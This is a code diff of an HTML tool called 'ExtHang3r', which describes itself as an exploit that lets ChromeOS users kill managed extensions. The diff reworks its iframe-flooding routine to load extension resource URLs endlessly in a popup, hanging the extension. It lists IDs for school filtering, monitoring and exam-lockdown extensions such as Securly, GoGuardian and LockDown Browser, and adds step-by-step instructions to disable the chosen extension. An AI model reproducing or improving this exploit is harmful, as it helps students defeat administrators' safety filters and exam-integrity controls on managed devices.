@@ -43,8 +43,7 @@
       border-radius: 8px;
     }
 
-    select,
-    button {
+    select {
       font-family: 'Varela Round', sans-serif;
       margin-bottom: 10px;
       padding: 10px;
@@ -55,14 +54,57 @@
     }
 
     button {
+      font-family: 'Varela Round', sans-serif;
       background-color: #007bff;
       color: #fff;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
       cursor: pointer;
+      border-radius: 5px;
+      margin-top: 10px;
       transition: background-color 0.3s ease;
     }
 
     button:hover {
       background-color: #0056b3;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      color: #fff;
+      font-size: 24px;
+      user-select: none;
+      flex-direction: column;
+    }
+
+    .spinner {
+      border: 6px solid rgba(255, 255, 255, 0.3);
+      border-top: 6px solid #fff;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
     }
 
     #killExtensionText {
@@ -122,18 +164,24 @@
   </header>
 
   <div class="container">
-    <p>ExtHang3r is an exploit that allows ChromeOS users to kill managed extensions after the LTMEAT patch. It remains unpatched in all new ChromeOS versions as of January 2025.</p>
+    <p>ExtHang3r is an exploit that allows ChromeOS users to kill managed extensions after the LTMEAT patch. It remains
+      unpatched in all new ChromeOS versions as of January 2025.</p>
     <label for="iframeSelect" id="labelForIframeSelect">Select extension:</label>
-    <select id="iframeSelect"></select>
-    <label for="iframeCountSlider" id="labelForIframeSlider" style="margin-top: 20px;">The slider below changes the amount of iframes that will be created. Try it with the default first, and if the extension is not sufficiently impacted, increase the number.</label>
-    <div style="display: flex; align-items: center; gap: 10px; margin: 10px 0;">
-      <input type="range" id="iframeCountSlider" min="100" max="25000" value="2000" step="100" style="flex-grow: 1;">
-      <span id="iframeCountValue">2000</span>
-    </div>
-    <button onclick="startHanging();" id="hangButton">Hang Extension!</button>
+    <select id="iframeSelect">
+    </select>
+    <label for="iframeCountSlider" id="labelForIframeSlider" style="margin-top: 20px;">The slider below changes the amount of iframes that will be created. Try it with the default first, and if the extension comes back after a few minutes increase it and try again. Tip: If your computer crashes or freezes for more than 2 minutes, you should definitely decrease the amount of iframes.</label>
+  	<div style="display: flex; align-items: center; gap: 10px; margin: 10px 0;">
+  		<input type="range" id="iframeCountSlider" min="100" max="15000" value="2000" step="100" style="flex-grow: 1;">
+  		<span id="iframeCountValue">3000</span>
+	</div>
+    <button onclick="warning();" id="hangButton">Hang Extension!</button>
     <button id="killButton" onclick="openExtensionPopup();">Kill Extension!</button>
   </div>
 
+  <div class="overlay" id="overlay">
+    <div class="spinner"></div>
+    Hanging... (This will take about 1 minute)
+  </div>
   <div id="killExtensionText"></div>
 
   <footer>
@@ -142,20 +190,34 @@
 
   <script>
     document.addEventListener("DOMContentLoaded", function () {
-      const slider = document.getElementById("iframeCountSlider");
-      const sliderValueDisplay = document.getElementById("iframeCountValue");
+    const slider = document.getElementById("iframeCountSlider");
+    const sliderValueDisplay = document.getElementById("iframeCountValue");
+    const deviceMemory = navigator.deviceMemory || 8; // It will be set to 8gb if you're in the data url, since navigator isnt supported.
+    const defaultIframeCount = Math.round(deviceMemory * 500);  // This changes the default value of the iframe slider based on how much memory your computer has
+    const maxIframeCount = Math.round(deviceMemory * 1500);
 
-      sliderValueDisplay.textContent = slider.value;
+    slider.value = defaultIframeCount;
+    slider.max = maxIframeCount;
+    sliderValueDisplay.textContent = defaultIframeCount;
 
-      slider.addEventListener("input", function () {
-        sliderValueDisplay.textContent = this.value;
-      });
+    slider.addEventListener("input", function () {
+      sliderValueDisplay.textContent = this.value;
     });
-
+  });
+  
+  	document.getElementById("iframeCountSlider").addEventListener("input", function () {
+  	  const iframeCountValue = document.getElementById("iframeCountValue");
+ 	  iframeCountValue.textContent = this.value;
+    });
+  
     async function checkExtensionURL(url) {
       try {
         const response = await fetch(url);
-        return response.ok;
+        if (response.ok) {
+          return true;
+        } else {
+          return false;
+        }
       } catch (error) {
         return false;
       }
@@ -164,8 +226,8 @@
     async function populateSelectOptions() {
       const selectElement = document.getElementById("iframeSelect");
       const extensions = {
-        "Securly (1st ID)": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
-        "Securly (2nd ID)": "chrome-extension://ckecmkbnoanpgplccmnoikfmpcdladkc/fonts/Metropolis.css",
+	"Securly (1st ID)": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
+	"Securly (2nd ID)": "chrome-extension://ckecmkbnoanpgplccmnoikfmpcdladkc/fonts/Metropolis.css",
         "Securly (old)": "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
         "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
         "LANSchool": "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
@@ -196,7 +258,7 @@
         "Lockdown Browser": "chrome-extension://fogjeanjfbiombghnmkmmophfeccjdki/manifest.json",
         "Linewize Filter": "chrome-extension://ifinpabiejbjobcphhaomiifjibpkjlf/background/assets/pages/default-blocked.html",
         "Borderless Classroom Student": "chrome-extension://kdpgkligilplaanoablcpjahjjeghcl/pages/blockPage.html",
-        "LockDown Browser AP Classroom Edition": "chrome-extension://djpknfecbncogekjnjppojlaipeobkmo/assets/images/icon_128.png",
+	"LockDown Browser AP Classroom Edition": "chrome-extension://djpknfecbncogekjnjppojlaipeobkmo/assets/images/icon_128.png",
       };
 
       let hasSupportedExtensions = false;
@@ -222,38 +284,53 @@
 
     populateSelectOptions();
 
-    function createIframes(container, iframeSrc, iframeCount) {
-      let index = 0;
-      const intervalId = setInterval(() => {
-        if (index >= iframeCount) {
-          clearInterval(intervalId);
-          return;
-        }
+    function replaceIframes(container, iframeSrc, iframeCount) {
+      for (let i = 0; i < iframeCount; i++) {
         const iframe = document.createElement('iframe');
         iframe.src = iframeSrc;
         iframe.style.width = '100%';
         iframe.style.height = '100px';
-        iframe.loading = 'lazy'; // Lazy loading
         container.appendChild(iframe);
-        index++;
-      }, 50);
+      }
+      setTimeout(function () {
+        while (container.firstChild) {
+          container.removeChild(container.firstChild);
+        }
+        replaceIframes(container, iframeSrc, iframeCount);
+      }, 5);
     }
 
-    function startHanging() {
+    function warning() {
+      const overlay = document.getElementById("overlay");
+      overlay.style.display = "flex";
       const iframeSelect = document.getElementById("iframeSelect");
+      const selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
       const selectedSrc = iframeSelect.value;
       const iframeCount = parseInt(document.getElementById("iframeCountSlider").value, 10);
-      const container = document.getElementById("iframeContainer") || document.createElement('div');
-      container.id = "iframeContainer";
-      document.body.appendChild(container);
-
-      // Remove old iframes
-      while (container.firstChild) {
-        container.removeChild(container.firstChild);
-      }
-
-      // Create new iframes over time
-      createIframes(container, selectedSrc, iframeCount);
+      const popup = window.open("", "PopupWindow", "width=100,height=100");
+      const popupDocument = popup.document;
+      const popupBody = popupDocument.body;
+      const iframeContainer = popupDocument.createElement('div');
+      iframeContainer.id = 'iframeContainer';
+      popupBody.appendChild(iframeContainer);
+      replaceIframes(iframeContainer, selectedSrc, iframeCount);
+      setTimeout(function () {
+        popup.close();
+        const killExtensionText = document.getElementById("killExtensionText");
+        killExtensionText.innerHTML = "Now that the extension <strong>" + selectedOption + "</strong> has been hanged, press the button above.";
+        setTimeout(function () {
+          overlay.style.display = "none";
+          killExtensionText.style.display = "block";
+          document.getElementById("killButton").style.display = "inline-block";
+          document.getElementById("hangButton").style.display = "none";
+          document.getElementById("iframeSelect").style.display = "none";
+          document.getElementById("labelForIframeSelect").style.display = "none";
+          document.getElementById("iframeCountSlider").style.display = "none";
+          document.getElementById("iframeCountValue").style.display = "none";
+          document.getElementById("labelForIframeSlider").style.display = "none";
+          document.getElementById("killButton").setAttribute("data-url", selectedSrc);
+        }, 10000);
+      }, 5000);
     }
 
     function openExtensionPopup() {
@@ -261,7 +338,7 @@
       const extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
       const killExtensionText = document.getElementById("killExtensionText");
       document.getElementById("killButton").style.display = "none";
-      killExtensionText.innerHTML = "Make sure to keep this tab open. Then open <strong>chrome://extensions/?id=" + extensionId + "</strong> and flip the switch called \"Allow access to file URLs\" twice.";
+      killExtensionText.innerHTML = "Make sure to keep this tab open. Then open <strong>chrome://extensions/?id=" + extensionId + "</strong> and flip the switch called \"Allow access to file URLs\" twice. The extension was successfully killed! Now you can close that tab as well as this one. If you want to restore the extension, flip the allow access to file URLs switch again.";
       window.location.href = selectedSrc;
     }
   </script>
